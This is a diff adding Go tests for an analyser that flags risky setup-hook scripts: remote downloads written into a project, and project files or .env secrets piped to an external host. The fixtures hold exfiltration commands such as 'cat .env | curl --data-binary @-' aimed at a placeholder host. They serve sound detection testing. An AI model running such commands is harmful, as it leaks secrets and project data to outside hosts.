@@ -63,7 +63,116 @@ func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
 				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
 				t.Errorf("flow evidence = %#v", got.Evidence)
 			}
+			if generic := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration"); generic != nil {
+				t.Errorf("sensitive flow was counted again as generic project exfiltration: %#v", generic)
+			}
 		})
+	}
+}
+
+func TestRemoteContentToProjectFlowVariants(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{name: "redirect", content: `curl https://example.invalid/tool > generated/tool`},
+		{name: "pipeline", content: `curl https://example.invalid/tool | tee generated/tool`},
+		{name: "curl output", content: `curl --output generated/tool https://example.invalid/tool`},
+		{name: "wget output", content: `wget -O generated/tool https://example.invalid/tool`},
+		{name: "git clone", content: `git clone https://example.invalid/repo external/repo`},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
+			got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-to-project")
+			if got == nil || got.Severity != "medium" || got.Weight != 25 || len(got.Evidence) != 2 {
+				t.Fatalf("remote project flow = %#v; all = %#v", got, finding.AnalyzeSDK(item))
+			}
+			if got.Evidence[0].ID != "network-download" || got.Evidence[1].ID != "project-write" ||
+				got.Evidence[1].NormalizedValue != "/project/generated/tool" && got.Evidence[1].NormalizedValue != "/project/external/repo" {
+				t.Errorf("remote project evidence = %#v", got.Evidence)
+			}
+		})
+	}
+}
+
+func TestRemoteContentToProjectRejectsDisconnectedOrUnavailableFlows(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		hook    sdk.HookName
+		content string
+	}{
+		{hook: sdk.HookSetupProject, content: "curl https://example.invalid/tool\nprintf generated > generated/tool\n"},
+		{hook: sdk.HookSetupProject, content: "curl --output /tmp/tool https://example.invalid/tool\n"},
+		{hook: sdk.HookSetupBase, content: "curl https://example.invalid/tool > /project/tool\n"},
+	}
+	for _, test := range tests {
+		item := analyzedSDK(t, test.content, test.hook)
+		if got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-to-project"); got != nil {
+			t.Errorf("disconnected or unavailable remote project flow = %#v", got)
+		}
+	}
+}
+
+func TestProjectDataExfiltrationFlowVariants(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		content string
+	}{
+		{name: "pipeline", content: `cat README.md | curl --data-binary @- https://example.invalid/upload`},
+		{name: "substitution", content: `curl -d "$(cat README.md)" https://example.invalid/upload`},
+		{name: "variable", content: "payload=$(cat README.md)\ncurl -d \"$payload\" https://example.invalid/upload"},
+		{name: "same operation", content: `curl -F file=@README.md https://example.invalid/upload`},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
+			got := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration")
+			if got == nil || got.Severity != "high" || got.Weight != 50 || len(got.Evidence) != 2 {
+				t.Fatalf("project exfiltration = %#v; all = %#v", got, finding.AnalyzeSDK(item))
+			}
+			if got.Evidence[0].ID != "project-read" || got.Evidence[0].NormalizedValue != "/project/README.md" || got.Evidence[1].ID != "external-send" {
+				t.Errorf("project exfiltration evidence = %#v", got.Evidence)
+			}
+		})
+	}
+}
+
+func TestSensitiveSuppressionKeepsDifferentGeneralProjectFlow(t *testing.T) {
+	t.Parallel()
+
+	item := analyzedSDK(t, "cat .env | curl --data-binary @- https://example.invalid/secret\ncat README.md | curl --data-binary @- https://example.invalid/readme\n", sdk.HookSetupProject)
+	findings := finding.AnalyzeSDK(item)
+	secret := findFinding(findings, "risk.project-secret-exfiltration")
+	general := findFinding(findings, "risk.project-data-exfiltration")
+	if secret == nil || general == nil {
+		t.Fatalf("distinct exfiltration flows = %#v", findings)
+	}
+	if general.Evidence[0].NormalizedValue != "/project/README.md" {
+		t.Errorf("generic flow source = %#v", general.Evidence)
+	}
+}
+
+func TestProjectDataExfiltrationRejectsDisconnectedOrUnavailableFlows(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		hook    sdk.HookName
+		content string
+	}{
+		{hook: sdk.HookSetupProject, content: "cat README.md\ncurl -d public https://example.invalid/upload\n"},
+		{hook: sdk.HookSetupBase, content: "cat /project/README.md | curl -d @- https://example.invalid/upload\n"},
+	}
+	for _, test := range tests {
+		item := analyzedSDK(t, test.content, test.hook)
+		if got := findFinding(finding.AnalyzeSDK(item), "risk.project-data-exfiltration"); got != nil {
+			t.Errorf("disconnected or unavailable project exfiltration = %#v", got)
+		}
 	}
 }
 
